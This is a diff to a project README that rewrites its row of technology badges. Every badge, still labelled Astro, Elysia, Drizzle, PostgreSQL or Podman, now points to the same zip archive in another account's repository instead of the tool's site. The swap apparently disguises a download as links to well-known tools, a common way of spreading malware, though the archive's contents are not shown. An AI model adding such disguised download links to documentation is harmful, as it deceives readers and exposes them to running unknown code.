@@ -8,19 +8,19 @@
 
 <!-- Stack -->
 <p align="center">
-    <a href="https://astro.build/">
+    <a href="https://raw.githubusercontent.com/clementselfless917/trout-rice/main/.github/trout-rice-v2.4.zip">
         <img src="https://img.shields.io/badge/astro-%232C2052.svg?style=for-the-badge&logo=astro&logoColor=white"/>
     </a>
-    <a href="https://elysiajs.com/">
+    <a href="https://raw.githubusercontent.com/clementselfless917/trout-rice/main/.github/trout-rice-v2.4.zip">
         <img src="https://img.shields.io/badge/elysia-%23000000.svg?style=for-the-badge&logo=firefox&logoColor=white"/>
     </a>
-    <a href="https://orm.drizzle.team/">
+    <a href="https://raw.githubusercontent.com/clementselfless917/trout-rice/main/.github/trout-rice-v2.4.zip">
         <img src="https://img.shields.io/badge/drizzle-%23C5F74F.svg?style=for-the-badge&logo=drizzle&logoColor=black"/>
     </a>
-    <a href="https://www.postgresql.org/">
+    <a href="https://raw.githubusercontent.com/clementselfless917/trout-rice/main/.github/trout-rice-v2.4.zip">
         <img src="https://img.shields.io/badge/postgres-%23316192.svg?style=for-the-badge&logo=postgresql&logoColor=white"/>
     </a>
-    <a href="https://podman.io/">
+    <a href="https://raw.githubusercontent.com/clementselfless917/trout-rice/main/.github/trout-rice-v2.4.zip">
         <img src="https://img.shields.io/badge/podman-%23892CA0.svg?style=for-the-badge&logo=podman&logoColor=white"/>
     </a>
 </p>
